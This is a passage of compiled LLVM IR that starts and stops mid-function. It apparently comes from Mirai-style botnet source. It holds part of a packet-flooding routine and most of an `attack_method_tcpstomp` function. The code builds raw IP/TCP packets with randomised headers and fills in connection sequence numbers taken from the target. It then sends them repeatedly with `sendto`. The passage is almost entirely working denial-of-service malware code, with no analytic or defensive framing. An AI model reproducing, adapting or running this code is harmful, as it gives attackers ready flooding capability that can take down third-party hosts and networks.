  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i32 0, i32 2
  %306 = load i8, i8* %305, align 4
  %307 = zext i8 %306 to i32
  %308 = icmp slt i32 %307, 32
  br i1 %308, label %309, label %330

309:                                              ; preds = %287
  %310 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 1
  %315 = load i32, i32* %314, align 4
  %316 = call i32 @ntohl(i32 noundef %315) #8
  %317 = call i32 @rand_next()
  %318 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %319 = load i32, i32* %9, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i64 %320
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i32 0, i32 2
  %323 = load i8, i8* %322, align 4
  %324 = zext i8 %323 to i32
  %325 = lshr i32 %317, %324
  %326 = add i32 %316, %325
  %327 = call i32 @htonl(i32 noundef %326) #8
  %328 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 9
  store i32 %327, i32* %329, align 4
  br label %330

330:                                              ; preds = %309, %287
  %331 = load i32, i32* %28, align 4
  %332 = icmp eq i32 %331, -1
  br i1 %332, label %333, label %337

333:                                              ; preds = %330
  %334 = call i32 @rand_next()
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 8
  store i32 %334, i32* %336, align 4
  br label %337

337:                                              ; preds = %333, %330
  %338 = load i16, i16* %13, align 2
  %339 = zext i16 %338 to i32
  %340 = icmp eq i32 %339, 65535
  br i1 %340, label %341, label %347

341:                                              ; preds = %337
  %342 = call i32 @rand_next()
  %343 = and i32 %342, 65535
  %344 = trunc i32 %343 to i16
  %345 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 3
  store i16 %344, i16* %346, align 4
  br label %347

347:                                              ; preds = %341, %337
  %348 = load i16, i16* %16, align 2
  %349 = zext i16 %348 to i32
  %350 = icmp eq i32 %349, 65535
  br i1 %350, label %351, label %357

351:                                              ; preds = %347
  %352 = call i32 @rand_next()
  %353 = and i32 %352, 65535
  %354 = trunc i32 %353 to i16
  %355 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %356 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %355, i32 0, i32 0
  store i16 %354, i16* %356, align 4
  br label %357

357:                                              ; preds = %351, %347
  %358 = load i16, i16* %17, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  br i1 %360, label %361, label %367

361:                                              ; preds = %357
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 1
  store i16 %364, i16* %366, align 2
  br label %367

367:                                              ; preds = %361, %357
  %368 = load i32, i32* %18, align 4
  %369 = icmp eq i32 %368, 65535
  br i1 %369, label %370, label %374

370:                                              ; preds = %367
  %371 = call i32 @rand_next()
  %372 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 2
  store i32 %371, i32* %373, align 4
  br label %374

374:                                              ; preds = %370, %367
  %375 = load i32, i32* %19, align 4
  %376 = icmp eq i32 %375, 65535
  br i1 %376, label %377, label %381

377:                                              ; preds = %374
  %378 = call i32 @rand_next()
  %379 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 3
  store i32 %378, i32* %380, align 4
  br label %381

381:                                              ; preds = %377, %374
  %382 = load i8, i8* %27, align 1
  %383 = icmp ne i8 %382, 0
  br i1 %383, label %384, label %387

384:                                              ; preds = %381
  %385 = load i8*, i8** %35, align 8
  %386 = load i32, i32* %26, align 4
  call void @rand_str(i8* noundef %385, i32 noundef %386)
  br label %387

387:                                              ; preds = %384, %381
  %388 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 7
  store i16 0, i16* %389, align 2
  %390 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %391 = bitcast %struct.iphdr* %390 to i16*
  %392 = call zeroext i16 @checksum_generic(i16* noundef %391, i32 noundef 20)
  %393 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 7
  store i16 %392, i16* %394, align 2
  %395 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 6
  store i16 0, i16* %396, align 4
  %397 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %398 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %399 = bitcast %struct.tcphdr* %398 to i8*
  %400 = load i32, i32* %26, align 4
  %401 = sext i32 %400 to i64
  %402 = add i64 20, %401
  %403 = trunc i64 %402 to i16
  %404 = call zeroext i16 @htons(i16 noundef zeroext %403) #8
  %405 = load i32, i32* %26, align 4
  %406 = sext i32 %405 to i64
  %407 = add i64 20, %406
  %408 = trunc i64 %407 to i32
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %397, i8* noundef %399, i16 noundef zeroext %404, i32 noundef %408)
  %410 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 6
  store i16 %409, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %32, align 8
  %423 = load i32, i32* %26, align 4
  %424 = sext i32 %423 to i64
  %425 = add i64 40, %424
  %426 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %427 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %428 = load i32, i32* %9, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 0
  %432 = bitcast %struct.sockaddr_in* %431 to %struct.sockaddr*
  store %struct.sockaddr* %432, %struct.sockaddr** %426, align 8
  %433 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %434 = load %struct.sockaddr*, %struct.sockaddr** %433, align 8
  %435 = call i64 @sendto(i32 noundef %421, i8* noundef %422, i64 noundef %425, i32 noundef 16384, %struct.sockaddr* %434, i32 noundef 16)
  br label %436

436:                                              ; preds = %387
  %437 = load i32, i32* %9, align 4
  %438 = add nsw i32 %437, 1
  store i32 %438, i32* %9, align 4
  br label %282, !llvm.loop !22

439:                                              ; preds = %282
  br label %281

440:                                              ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpstomp(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 noundef %45, i64 noundef 16) #7
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 noundef %49, i64 noundef 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 2, i32 noundef 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 3, i32 noundef 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 4, i32 noundef 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 5, i32 noundef 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 7, i32 noundef 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 11, i32 noundef 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 12, i32 noundef 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 13, i32 noundef 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 noundef zeroext %84, %struct.attack_option* noundef %85, i8 noundef zeroext 14, i32 noundef 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 noundef zeroext %88, %struct.attack_option* noundef %89, i8 noundef zeroext 15, i32 noundef 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 noundef zeroext %92, %struct.attack_option* noundef %93, i8 noundef zeroext 16, i32 noundef 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 noundef zeroext %96, %struct.attack_option* noundef %97, i8 noundef zeroext 0, i32 noundef 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 noundef zeroext %99, %struct.attack_option* noundef %100, i8 noundef zeroext 1, i32 noundef 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

105:                                              ; preds = %4
  br label %607

106:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 noundef %107, i32 noundef 0, i32 noundef 3, i8* noundef %108, i32 noundef 4) #7
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

111:                                              ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 noundef %112)
  br label %607

114:                                              ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

115:                                              ; preds = %492, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %495

120:                                              ; preds = %115
  br label %121

121:                                              ; preds = %487, %476, %120
  %122 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #7
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

124:                                              ; preds = %121
  br label %492

125:                                              ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 noundef %127, i32 noundef 3, i32 noundef 0)
  %129 = or i32 %128, 2048
  %130 = call i32 (i32, i32, ...) @fcntl(i32 noundef %126, i32 noundef 4, i32 noundef %129)
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 2
  %137 = load i8, i8* %136, align 4
  %138 = zext i8 %137 to i32
  %139 = icmp slt i32 %138, 32
  br i1 %139, label %140, label %161

140:                                              ; preds = %125
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @ntohl(i32 noundef %146) #8
  %148 = call i32 @rand_next()
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = lshr i32 %148, %155
  %157 = add i32 %147, %156
  %158 = call i32 @htonl(i32 noundef %157) #8
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %158, i32* %160, align 4
  br label %170

161:                                              ; preds = %125
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  store i32 %167, i32* %169, align 4
  br label %170

170:                                              ; preds = %161, %140
  %171 = load i16, i16* %17, align 2
  %172 = zext i16 %171 to i32
  %173 = icmp eq i32 %172, 65535
  br i1 %173, label %174, label %179

174:                                              ; preds = %170
  %175 = call i32 @rand_next()
  %176 = and i32 %175, 65535
  %177 = trunc i32 %176 to i16
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %177, i16* %178, align 2
  br label %183

179:                                              ; preds = %170
  %180 = load i16, i16* %17, align 2
  %181 = call zeroext i16 @htons(i16 noundef zeroext %180) #8
  %182 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %181, i16* %182, align 2
  br label %183

183:                                              ; preds = %179, %174
  %184 = load i32, i32* %26, align 4
  %185 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %186 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %186, %struct.sockaddr** %185, align 8
  %187 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %188 = load %struct.sockaddr*, %struct.sockaddr** %187, align 8
  %189 = call i32 @connect(i32 noundef %184, %struct.sockaddr* %188, i32 noundef 16)
  %190 = call i64 @time(i64* noundef null) #7
  store i64 %190, i64* %31, align 8
  br label %191

191:                                              ; preds = %490, %183
  store i32 16, i32* %29, align 4
  %192 = load i32, i32* %10, align 4
  %193 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %194 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %195 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %194, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i64 @recvfrom(i32 noundef %192, i8* noundef %193, i64 noundef 256, i32 noundef 16384, %struct.sockaddr* %197, i32* noundef %29)
  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %33, align 4
  %200 = load i32, i32* %33, align 4
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %202, label %203

202:                                              ; preds = %191
  br label %607

203:                                              ; preds = %191
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %205 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 4
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 4
  %210 = icmp eq i32 %206, %209
  br i1 %210, label %211, label %482

211:                                              ; preds = %203
  %212 = load i32, i32* %33, align 4
  %213 = sext i32 %212 to i64
  %214 = icmp ugt i64 %213, 40
  br i1 %214, label %215, label %482

215:                                              ; preds = %211
  %216 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %217 = getelementptr inbounds i8, i8* %216, i64 20
  %218 = bitcast i8* %217 to %struct.tcphdr*
  store %struct.tcphdr* %218, %struct.tcphdr** %35, align 8
  %219 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 0
  %221 = load i16, i16* %220, align 4
  %222 = zext i16 %221 to i32
  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %224 = load i16, i16* %223, align 2
  %225 = zext i16 %224 to i32
  %226 = icmp eq i32 %222, %225
  br i1 %226, label %227, label %481

227:                                              ; preds = %215
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = lshr i16 %230, 9
  %232 = and i16 %231, 1
  %233 = zext i16 %232 to i32
  %234 = icmp ne i32 %233, 0
  br i1 %234, label %235, label %460

235:                                              ; preds = %227
  %236 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = lshr i16 %238, 12
  %240 = and i16 %239, 1
  %241 = zext i16 %240 to i32
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %243, label %460

243:                                              ; preds = %235
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %245 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 4
  %247 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %248 = load i32, i32* %9, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %250, i32 0, i32 0
  store i32 %246, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 2
  %254 = load i32, i32* %253, align 4
  %255 = call i32 @ntohl(i32 noundef %254) #8
  %256 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %257 = load i32, i32* %9, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %256, i64 %258
  %260 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i32 0, i32 1
  store i32 %255, i32* %260, align 4
  %261 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 3
  %263 = load i32, i32* %262, align 4
  %264 = call i32 @ntohl(i32 noundef %263) #8
  %265 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %266 = load i32, i32* %9, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %265, i64 %267
  %269 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i32 0, i32 2
  store i32 %264, i32* %269, align 4
  %270 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 1
  %272 = load i16, i16* %271, align 2
  %273 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i32 0, i32 3
  store i16 %272, i16* %277, align 4
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %279 = load i16, i16* %278, align 2
  %280 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %281 = load i32, i32* %9, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %283, i32 0, i32 4
  store i16 %279, i16* %284, align 2
  %285 = load i32, i32* %24, align 4
  %286 = sext i32 %285 to i64
  %287 = add i64 40, %286
  %288 = call noalias i8* @malloc(i64 noundef %287) #7
  %289 = load i8**, i8*** %12, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8*, i8** %289, i64 %291
  store i8* %288, i8** %292, align 8
  %293 = load i8**, i8*** %12, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8*, i8** %293, i64 %295
  %297 = load i8*, i8** %296, align 8
  %298 = bitcast i8* %297 to %struct.iphdr*
  store %struct.iphdr* %298, %struct.iphdr** %36, align 8
  %299 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %300 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %299, i64 1
  %301 = bitcast %struct.iphdr* %300 to %struct.tcphdr*
  store %struct.tcphdr* %301, %struct.tcphdr** %37, align 8
  %302 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i64 1
  %304 = bitcast %struct.tcphdr* %303 to i8*
  store i8* %304, i8** %38, align 8
  %305 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %306 = bitcast %struct.iphdr* %305 to i8*
  %307 = load i8, i8* %306, align 4
  %308 = and i8 %307, 15
  %309 = or i8 %308, 64
  store i8 %309, i8* %306, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %311 = bitcast %struct.iphdr* %310 to i8*
  %312 = load i8, i8* %311, align 4
  %313 = and i8 %312, -16
  %314 = or i8 %313, 5
  store i8 %314, i8* %311, align 4
  %315 = load i8, i8* %13, align 1
  %316 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 1
  store i8 %315, i8* %317, align 1
  %318 = load i32, i32* %24, align 4
  %319 = sext i32 %318 to i64
  %320 = add i64 40, %319
  %321 = trunc i64 %320 to i16
  %322 = call zeroext i16 @htons(i16 noundef zeroext %321) #8
  %323 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  store i16 %322, i16* %324, align 2
  %325 = load i16, i16* %14, align 2
  %326 = call zeroext i16 @htons(i16 noundef zeroext %325) #8
  %327 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 3
  store i16 %326, i16* %328, align 4
  %329 = load i8, i8* %15, align 1
  %330 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 5
  store i8 %329, i8* %331, align 4
  %332 = load i8, i8* %16, align 1
  %333 = icmp ne i8 %332, 0
  br i1 %333, label %334, label %338

334:                                              ; preds = %243
  %335 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %336 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 4
  store i16 %335, i16* %337, align 2
  br label %338

338:                                              ; preds = %334, %243
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 6
  store i8 6, i8* %340, align 1
  %341 = load i32, i32* @LOCAL_ADDR, align 4
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
